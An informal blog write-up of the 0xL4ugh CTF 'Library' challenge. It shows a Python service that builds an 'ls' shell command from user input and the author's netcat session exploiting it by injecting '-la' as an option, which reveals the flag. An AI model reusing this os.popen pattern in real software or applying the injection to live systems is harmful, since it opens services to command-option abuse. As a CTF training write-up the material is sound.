---
layout: post
title:  "laugh ctf"
date:   2024-02-11 09:29:20 +0700
categories: laugh ctf
usemathjax: true
---
## challenge
https://ctf24.0xl4ugh.com/challenges#Library-17
## files
```
C:\home\radha\Downloads\laugh_ctf\misc\library\Library> ls   
Dockerfile  build-docker.sh  challenge.py  exec.sh
```
## docker file 
```
FROM alpine:latest@sha256:51b67269f354137895d43f3b3d810bfacd3945438e94dc5ac55fdac340352f48
ENV PAGER=''
ENV FLAG='0xL4ugh{F4k3_Fl4G_F0r_T4stIng}'
RUN apk add socat python3 py3-pip
RUN adduser -D challenger
RUN pip3 install rich  --break-system-packages
WORKDIR /home/challenger
USER challenger
COPY challenge.py .
COPY exec.sh . 
ENTRYPOINT ["sh","exec.sh"]

```
### analysis
- we see flag is set as part of env varaible
## challenge.py
- it is a long file 
- find it (here)[https://drive.google.com/file/d/1xeojgJlid9T974jVUWzozuHCzlpgM_Ly/view?usp=drive_link]
## analysis
- at line 7 os module is imported 
- so a quick serach for where `os `is used 
- one place to get a random number ,user dont have contorl over the input line28
- another place line 136
```
def check_file_presence():
    book_name = shlex.quote(console.input("[bold blue]Enter the name of the book (file) to check:[/bold blue] "))
    command = "ls " + book_name

    try:
        result = os.popen(command).read().strip()
        print(result)
        if result == book_name:
            console.print(f"[bold green]The book is present in the current directory.[/bold green]")
        else:
            console.print(f"[bold red]The book is not found in the current directory.[/bold red]")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
```
- a quick search for when this funciton is called leads us to line 208

elif choice == 8:
            check_file_presence()



- so we need to give option 8
- our input is appended to ls command(long list of files)
- just tried ls -la

```
C:\tmp> nc 172.190.120.133 50003

Library Management System
1. Add Member
2. Add Book
3. Display Books
4. Search Book
5. Check Out Book
6. Return Book
7. Save Book
8. Check File Presence
0. Exit
Enter your choice (0-8): 8
Enter the name of the book (file) to check: -la
total 84
-rw-r--r--    1 challeng challeng         9 Feb 10 10:47 $FLAG
-rw-r--r--    1 challeng challeng         9 Feb  9 23:13 *
drwxr-sr-x    1 challeng challeng      4096 Feb 10 10:47 .
drwxr-xr-x    1 root     root          4096 Feb  1 14:20 ..
-rw-r--r--    1 challeng challeng        11 Feb 10 08:46 .env
-rw-r--r--    1 challeng challeng         9 Feb 10 10:35 0xL4ugh{TrU5t_M3_LiF3_I5_H4rD3r!}
-rw-r--r--    1 challeng challeng         9 Feb  9 18:22 <__main__.SaveFile object at 0x7f07dd284050>
-rw-r--r--    1 challeng challeng         9 Feb  9 21:50 <__main__.SaveFile object at 0x7f3807760310>
-rw-r--r--    1 challeng challeng         9 Feb  9 21:51 <__main__.SaveFile object at 0x7f380778a8d0>
-rw-r--r--    1 challeng challeng         9 Feb  9 21:54 <__main__.SaveFile object at 0x7f380778e090>
-rw-r--r--    1 challeng challeng         9 Feb 10 01:40 <__main__.SaveFile object at 0x7fbc9d0dab10>
-rw-r--r--    1 challeng challeng        11 Feb 10 10:46 FLAG
-rw-r--r--    1 challeng challeng         9 Feb  9 18:00 a
-rw-r--r--    1 challeng challeng         9 Feb  9 23:08 afkjkadf
-rw-rw-r--    1 root     root          8975 Jan 31 22:43 challenge.py
-rw-rw-r--    1 root     root           103 Jan 31 22:19 exec.sh
-rw-r--r--    1 challeng challeng         9 Feb  9 20:46 print()
-rw-r--r--    1 challeng challeng        11 Feb 10 01:39 {FLAG}
The book is not found in the current directory.

Library Management System
1. Add Member

```
and hhere is the flag
```-rw-r--r--    1 challeng challeng         9 Feb 10 10:35 0xL4ugh{TrU5t_M3_LiF3_I5_H4rD3r!}```
